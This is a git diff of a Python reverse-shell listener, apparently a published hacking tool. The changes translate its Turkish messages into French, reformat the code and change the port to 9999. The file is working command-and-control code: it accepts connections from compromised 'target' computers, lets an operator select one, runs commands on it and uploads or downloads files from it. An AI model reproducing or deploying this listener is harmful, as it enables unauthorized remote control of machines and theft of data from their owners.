@@ -9,45 +9,44 @@ import os
 from termcolor import colored
 import sys
 
+
 class Listener:
-    def __init__(self,ip,port):
+    def __init__(self, ip, port):
         self.about()
         self.threads = 2
         self.jobs = [1, 2]
         self.queue = Queue()
-        self.ip=ip
-        self.port=port
+        self.ip = ip
+        self.port = port
         self.baglantilar = []
         self.adresler = []
-        self.connection=None
-        self.aktif_hedef=None
-        self.quit=True
-        self.cwd=None
-        self.cwd_durum=True
-        self.komutlar = {'help:': "Uygulama kullanımı hakkında bilgi verir.",
-                         'list:': "Bağlantı sağlayan bilgisayarları listeler.",
-                         'select:': "Bağlantı sağlayan bilgisayarları seçmek için kullanılır.Seçim işlemi listelenen bilgisayarların index numaralarına göre yapılır.",
-                         'quit:': "Seçilmiş olan  bilgisayardan bağlantıyı durdurmak için kullanılır.",
-                         'exit:': "Serverin çalışmasını durdurur.Uygulamadan çıkış yapar.",
-                         'upload:': "Seçilen hedef makineye dosya yüklenmesini sağlar.Hedef bilgisayar seçildikten sonra bu komut çalışır.",
-                         'download:': "Seçilen hedef makineden dosya indirilmesini sağlar.Hedef bilgisayar seçildikten sonra bu komut çalışır.",
-                    }
-        print(self.uyari_renk("[+] Server Başlatıldı.",1))
-        print(self.uyari_renk("[+] Gelen bağlantılar bekleniliyor...",1))
-
+        self.connection = None
+        self.aktif_hedef = None
+        self.quit = True
+        self.cwd = None
+        self.cwd_durum = True
+        self.komutlar = {'help:': "Donne des informations sur comment utiliser l application. ",
+                         'list:': "Répertorie les ordinateurs qui se connectent. ",
+                         'select:': "Permet de sélectionner parmi les ordinateurs connectés qui sont indexés. ",
+                         'quit:': "Arrête la connexion depuis un ordinateur selectionné. ",
+                         'exit:': "Arrête le serveur en cours d exécution et quitte l application. ",
+                         'upload:': "Elle permet de upload des fichiers sur la machine cible sélectionnée. Cette commande s exécute après la sélection de l ordinateur cible. ",
+                         'download:': "Elle permet de télécharger des fichiers sur la machine cible sélectionnée. Cette commande s exécute après la sélection de l ordinateur cible. ",
+                         }
+        print(self.uyari_renk("[+] Serveur démarré.", 1))
+        print(self.uyari_renk("[+] En attente de connexions entrantes ...", 1))
 
     def yardim(self):
         for komut, aciklama in self.komutlar.items():
             print(self.uyari_renk(komut, 1) + "\t" + aciklama)
 
-    def uyari_renk(self,mesaj,durum):
-        if durum==1:
-            return colored(mesaj,"green")
-        elif durum==2:
-            return colored(mesaj,"red")
-        elif durum==3:
-            return colored(mesaj,"blue")
-
+    def uyari_renk(self, mesaj, durum):
+        if durum == 1:
+            return colored(mesaj, "green")
+        elif durum == 2:
+            return colored(mesaj, "red")
+        elif durum == 3:
+            return colored(mesaj, "blue")
 
     def thread_olustur(self):
         for _ in range(self.threads):
@@ -88,36 +87,39 @@ class Listener:
                 adres = adres + (str(baglanti.recv(1024), "utf-8"),)
                 self.baglantilar.append(baglanti)
                 self.adresler.append(adres)
-                print(self.uyari_renk("\n[+] " + adres[-1] + " (" + adres[0] + ")" + " adresinden bağlantı kuruldu",1))
+                print(self.uyari_renk(
+                    "\n[+] " + adres[-1] + " (" + adres[0] + ")" + " est connecté", 1))
 
-                if self.quit==True:
-                    print(self.uyari_renk("listener >> ",3),end="")
+                if self.quit == True:
+                    print(self.uyari_renk("listener >> ", 3), end="")
                 else:
-                    if self.connection.getpeername()[0]==baglanti.getpeername()[0]:
+                    if self.connection.getpeername()[0] == baglanti.getpeername()[0]:
                         self.cwd_durum = False
                         self.aktif_baglanti_kes(False)
                     else:
-                        self.cwd=self.komut_yurut(["getcwd"])
-                        print(self.uyari_renk(self.cwd,3),end="")
+                        self.cwd = self.komut_yurut(["getcwd"])
+                        print(self.uyari_renk(self.cwd, 3), end="")
             except Exception as e:
-                print(self.uyari_renk("[-] Hedefe bağlantı sırasında hata oluştu",2))
-                print(self.uyari_renk("[-] Hata mesajı:"+str(e),2))
+                print(self.uyari_renk(
+                    "[-] Une erreur s est produite lors de la liaison à la cible", 2))
+                print(self.uyari_renk("[-] Message d'erreur:"+str(e), 2))
                 self.cwd_durum = False
                 self.aktif_baglanti_kes(False)
 
-    def listener_komut_calistir(self,durum=True):
+    def listener_komut_calistir(self, durum=True):
         while durum:
             komut = input(self.uyari_renk('listener >> ', 3))
             if komut == 'list':
                 self.listele()
             elif "select" in komut:
-                if len(komut.split(" "))>1:
-                    self.connection,self.aktif_hedef = self.hedef_sec(komut)
+                if len(komut.split(" ")) > 1:
+                    self.connection, self.aktif_hedef = self.hedef_sec(komut)
                     if self.connection is not None:
-                        self.quit=False
+                        self.quit = False
                         self.backdoor_komut_calistir()
                 else:
-                    print(self.uyari_renk("[-] Lütfen bir hedef seçimi yapınız!",2))
+                    print(self.uyari_renk(
+                        "[-] Veuillez choisir une cible!", 2))
             elif komut == "help":
                 self.yardim()
             elif komut == 'exit':
@@ -126,16 +128,18 @@ class Listener:
                     self.queue.task_done()
                 except:
                     continue
-                print(self.uyari_renk("[*] Server'dan çıkış yapıldı",1))
+                print(self.uyari_renk("[*] Déconnecté du serveur", 1))
                 break
             else:
-                print(self.uyari_renk("[-] Komut işlenemedi!",2))
-                print(self.uyari_renk("[*] Uygulama kullanımı için 'help' komutunu giriniz!", 2))
+                print(self.uyari_renk(
+                    "[-] La commande n a pas pu être traitée!", 2))
+                print(self.uyari_renk(
+                    "[*] Entrez la commande 'help' pour savoir comment utiliser l application!", 2))
         if self.cwd_durum == False:
-            print(self.cwd,end="")
+            print(self.cwd, end="")
             self.cwd_durum = True
 
-    def listele(self,durum=True):
+    def listele(self, durum=True):
         sonuc = ''
         for i, baglanti in enumerate(self.baglantilar):
             try:
@@ -145,34 +149,37 @@ class Listener:
                 del self.adresler[i]
                 continue
             if durum:
-                sonuc += str(i) + "\t" + str(self.adresler[i][0]) + "\t" + str(self.adresler[i][1]) + "\t" + str(self.adresler[i][2]) + "\n"
+                sonuc += str(i) + "\t" + str(self.adresler[i][0]) + "\t" + str(
+                    self.adresler[i][1]) + "\t" + str(self.adresler[i][2]) + "\n"
         if durum:
-            print(self.uyari_renk("*_______________Clients________________*",3))
-            print(self.uyari_renk("index\tIp Adresi\tPort\tHostname",3))
-            print(self.uyari_renk(sonuc,1))
+            print(self.uyari_renk("*_______________Clients________________*", 3))
+            print(self.uyari_renk("index\tAdresse IP\tPort\tHostname", 3))
+            print(self.uyari_renk(sonuc, 1))
 
-    def hedef_sec(self,index):
+    def hedef_sec(self, index):
         try:
             index = index.replace('select ', '')
             index = int(index)
         except:
-            print(self.uyari_renk("[-] Lütfen geçerli bir hedef seçiniz",2))
-            return None,None
+            print(self.uyari_renk(
+                "[-] Veuillez sélectionner une cible valide", 2))
+            return None, None
         try:
             baglanti = self.baglantilar[index]
             baglanti.send(str.encode(" "))
-            print(self.uyari_renk("[+] " + str(self.adresler[index][2]) + " (" + str( self.adresler[index][0]) + ") bilgisayarına bağlandınız",1))
-            return baglanti,index
+            print(self.uyari_renk("[+] " + str(self.adresler[index][2]) + " (" + str(
+                self.adresler[index][0]) + ") connecté à votre ordinateur", 1))
+            return baglanti, index
 
         except:
             if len(self.baglantilar) > index:
                 del self.baglantilar[index]
                 del self.adresler[index]
-            print(self.uyari_renk("[-] Lütfen geçerli bir hedef seçiniz",2))
-            return None,None
+            print(self.uyari_renk(
+                "[-] Veuillez sélectionner une cible valide", 2))
+            return None, None
 
-
-    def aktif_baglanti_kes(self,durum=True):
+    def aktif_baglanti_kes(self, durum=True):
         self.aktif_baglanti_sifirla()
         self.listele(False)
         if durum:
@@ -181,13 +188,12 @@ class Listener:
             self.listener_komut_calistir(False)
 
     def aktif_baglanti_sifirla(self):
-        self.connection=None
-        self.quit=True
+        self.connection = None
+        self.quit = True
         if self.aktif_hedef:
             del self.baglantilar[self.aktif_hedef]
             del self.adresler[self.aktif_hedef]
-            self.aktif_hedef=None
-
+            self.aktif_hedef = None
 
     def komut_yurut(self, komut):
         try:
@@ -195,17 +201,18 @@ class Listener:
                 self.gonder(komut)
                 return self.al()
             else:
-                print(self.uyari_renk("[-] Üzerinde işlem yaptığınız hedef bilgisayarın bağlantısı kesildi...", 2))
-                print(self.uyari_renk("[-] Bağlantı Kapatıldı!", 2))
+                print(self.uyari_renk(
+                    "[-] L ordinateur cible sur lequel vous travaillez est déconnecté ...", 2))
+                print(self.uyari_renk("[-] Connexion fermée!", 2))
                 self.aktif_baglanti_sifirla()
         except Exception as e:
-            print(self.uyari_renk("[-] Üzerinde işlem yaptığınız hedef bilgisayarın bağlantısı kesildi...", 2))
-            print(self.uyari_renk("[-] Hata mesajı: " + str(e), 2))
-            print(self.uyari_renk("[-] Bağlantı Kapatıldı!", 2))
+            print(self.uyari_renk(
+                "[-] L ordinateur cible sur lequel vous travaillez est déconnecté ...", 2))
+            print(self.uyari_renk("[-] Message d erreur: " + str(e), 2))
+            print(self.uyari_renk("[-] Connexion fermée!", 2))
             self.aktif_baglanti_sifirla()
 
-
-    def gonder(self,veri):
+    def gonder(self, veri):
         json_veri = json.dumps(veri)
         self.connection.send(str.encode(json_veri))
 
@@ -213,7 +220,8 @@ class Listener:
         json_veri = ""
         while True:
             try:
-                json_veri = json_veri + str(self.connection.recv(1024),"utf-8")
+                json_veri = json_veri + \
+                    str(self.connection.recv(1024), "utf-8")
                 return json.loads(json_veri)
             except ValueError:
                 continue
@@ -223,25 +231,25 @@ class Listener:
     def dosya_kontrol(self, dosya):
         return os.path.isfile(path=dosya)
 
-    def dosya_yaz(self,path,content):
+    def dosya_yaz(self, path, content):
         try:
-            with open(path,"wb") as file:
+            with open(path, "wb") as file:
                 file.write(base64.b64decode(content))
-                return self.uyari_renk("[+] İndirme Başarılı!",1)
+                return self.uyari_renk("[+] Téléchargement réussi!", 1)
         except Exception as e:
-            return self.uyari_renk("[-] Dosya indirme işlemi başarısız!"+"\n[-] Hata mesajı:"+str(e),2)
+            return self.uyari_renk("[-] Le téléchargement du fichier a échoué!"+"\n[-] Message d erreur:"+str(e), 2)
 
     def dosya_oku(self, dosya):
         try:
             with open(dosya, "rb") as file:
-                return str(base64.b64encode(file.read()),"utf-8")
+                return str(base64.b64encode(file.read()), "utf-8")
         except Exception as e:
-            return self.uyari_renk("[-] Dosya yükleme işlemi başarısız \n[-] Hata mesajı:"+str(e),2)
+            return self.uyari_renk("[-] Le téléchargement du fichier a échoué \n[-] Message d erreur:"+str(e), 2)
 
     def backdoor_komut_calistir(self):
-        cwd=self.al()
+        cwd = self.al()
         if cwd:
-            print(self.uyari_renk(cwd,3), end="")
+            print(self.uyari_renk(cwd, 3), end="")
 
         while not self.quit:
             try:
@@ -255,10 +263,12 @@ class Listener:
                                 dosya = self.dosya_oku(komut[1])
                                 komut.append(dosya)
                             else:
-                                sonuc = self.uyari_renk("[-] Yüklemek için, '" + komut[1] + "' adında bir dosya bulunmamaktadır!",2)
+                                sonuc = self.uyari_renk(
+                                    "[-] Pour installer, '" + komut[1] + "' Il n y a aucun fichier nommé!", 2)
                                 durum = False
                         else:
-                            sonuc = self.uyari_renk("[-] Lütfen yüklenecek dosyayı belirtiniz!",2)
+                            sonuc = self.uyari_renk(
+                                "[-] Veuillez spécifier le fichier à télécharger!", 2)
                             durum = False
 
                     if komut[0] == "download":
@@ -266,11 +276,11 @@ class Listener:
 
                             sonuc = self.komut_yurut(komut)
                             if sonuc:
-                                self.cwd=sonuc[sonuc.rfind("\n\n"):]
+                                self.cwd = sonuc[sonuc.rfind("\n\n"):]
                     elif durum:
                         sonuc = self.komut_yurut(komut)
                         if sonuc:
-                            self.cwd=sonuc[sonuc.rfind("\n\n"):]
+                            self.cwd = sonuc[sonuc.rfind("\n\n"):]
                     else:
                         self.cwd = self.komut_yurut(["getcwd"])
                         sonuc += self.cwd
@@ -280,12 +290,13 @@ class Listener:
                             if "[-]" not in sonuc:
                                 sonuc = self.dosya_yaz(komut[1], sonuc)
                         else:
-                            sonuc = self.uyari_renk("[-] Lütfen indirilecek dosyayı belirtiniz!",2)
+                            sonuc = self.uyari_renk(
+                                "[-] Veuillez spécifier le fichier à télécharger!", 2)
 
                     elif komut[0] == "quit":
                         break
                 else:
-                    self.cwd=self.komut_yurut(["getcwd"])
+                    self.cwd = self.komut_yurut(["getcwd"])
                     sonuc = self.uyari_renk(self.cwd, 3)
 
                 if sonuc:
@@ -293,37 +304,51 @@ class Listener:
                     if komut:
                         if komut[0] == "download":
                             self.cwd = self.komut_yurut(["getcwd"])
-                            print(self.uyari_renk(self.cwd,3), end='')
+                            print(self.uyari_renk(self.cwd, 3), end='')
 
             except Exception as e:
-                print(self.uyari_renk("[-] Komut yürütme sırasında hata: "+ str(e),2))
+                print(self.uyari_renk(
+                    "[-] Erreur lors de l exécution de la commande:" + str(e), 2))
 
-        print("\n[*] Çıkış Yapıldı")
+        print("\n[*] Déconnecté")
         self.aktif_baglanti_sifirla()
 
     def about(self):
-        print(self.uyari_renk("  _____                                 _____ _          _ _ ", 1))
-        print(self.uyari_renk(" |  __ \                               / ____| |        | | |", 1))
-        print(self.uyari_renk(" | |__) |_____   _____ _ __ ___  ___  | (___ | |__   ___| | |", 1))
-        print(self.uyari_renk(" |  _  // _ \ \ / / _ \ '__/ __|/ _ \  \___ \| '_ \ / _ \ | |", 1))
-        print(self.uyari_renk(" | | \ \  __/\ V /  __/ |  \__ \  __/  ____) | | | |  __/ | |", 1))
-        print(self.uyari_renk(" |_|  \_\___| \_/ \___|_|  |___/\___| |_____/|_| |_|\___|_|_|", 1))
-        print(self.uyari_renk("# ==============================================================================",1))
+        print(self.uyari_renk(
+            "  _____                                 _____ _          _ _ ", 1))
+        print(self.uyari_renk(
+            " |  __ \                               / ____| |        | | |", 1))
+        print(self.uyari_renk(
+            " | |__) |_____   _____ _ __ ___  ___  | (___ | |__   ___| | |", 1))
+        print(self.uyari_renk(
+            " |  _  // _ \ \ / / _ \ '__/ __|/ _ \  \___ \| '_ \ / _ \ | |", 1))
+        print(self.uyari_renk(
+            " | | \ \  __/\ V /  __/ |  \__ \  __/  ____) | | | |  __/ | |", 1))
+        print(self.uyari_renk(
+            " |_|  \_\___| \_/ \___|_|  |___/\___| |_____/|_| |_|\___|_|_|", 1))
+        print(self.uyari_renk(
+            "# ==============================================================================", 1))
         print(self.uyari_renk("# author      	:", 1) + "Mustafa Dalga")
         print(self.uyari_renk("# website    	:", 1) + "https://apierson.com")
-        print(self.uyari_renk("# linkedin    	:", 1) + "https://www.linkedin.com/in/mustafadalga")
-        print(self.uyari_renk("# github      	:", 1) + "https://github.com/mustafadalga")
-        print(self.uyari_renk("# email      	:", 1) + "mustafadalgaa < at > gmail[.]com")
-        print(self.uyari_renk("# description 	:", 1) + "Hedef bilgisayarlardan gelen birden fazla bağlantıya izin veren ,çoklu istemcili reverse shell.")
+        print(self.uyari_renk("# linkedin    	:", 1) +
+              "https://www.linkedin.com/in/mustafadalga")
+        print(self.uyari_renk("# github      	:", 1) +
+              "https://github.com/mustafadalga")
+        print(self.uyari_renk("# email      	:", 1) +
+              "mustafadalgaa < at > gmail[.]com")
+        print(self.uyari_renk("# description 	:", 1) +
+              "Reverse-Shell multi-clients qui autorise plusieurs connexions à partir des ordinateurs cibles.")
         print(self.uyari_renk("# date        	:", 1) + "29.06.2019")
         print(self.uyari_renk("# version     	:", 1) + "1.0")
         print(self.uyari_renk("# python_version:", 1) + "3.7.2")
-        print(self.uyari_renk("# ==============================================================================",1))
+        print(self.uyari_renk(
+            "# ==============================================================================", 1))
+
 
 try:
-    listener = Listener('',2019)
+    listener = Listener('', 9999)
     listener.thread_olustur()
     listener.gorev_olustur()
 except:
-    print(listener.uyari_renk("\n\n[*] Server'dan çıkış yapıldı",1))
+    print(listener.uyari_renk("\n\n[*] Déconnecté du serveur", 1))
     sys.exit()
